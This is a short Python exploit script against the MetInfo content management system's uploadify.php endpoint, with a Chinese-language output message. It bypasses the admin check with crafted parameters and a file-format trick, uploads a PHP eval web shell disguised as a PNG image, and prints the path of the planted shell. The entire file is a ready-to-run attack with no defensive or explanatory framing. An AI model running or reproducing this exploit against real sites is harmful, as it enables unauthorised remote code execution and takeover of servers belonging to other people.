import requests
import sys


url = sys.argv[1]
payload = "/admin/include/uploadify.php?metinfo_admin_id=aaa&metinfo_admin_pass=bbb&met_admin_table=met_admin_table%23&type=upfile&met_file_format=jpg|pphphp"

headers = {
    "User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"
}
files = {
    'Filedata':('Setup.php',"<?php @eval($_REQUEST[777])?>",'image/png')
}
res = requests.post(url =url + payload ,headers = headers ,files = files)

print("[+] Shell路径为: {}".format(url+res.text[4:])) 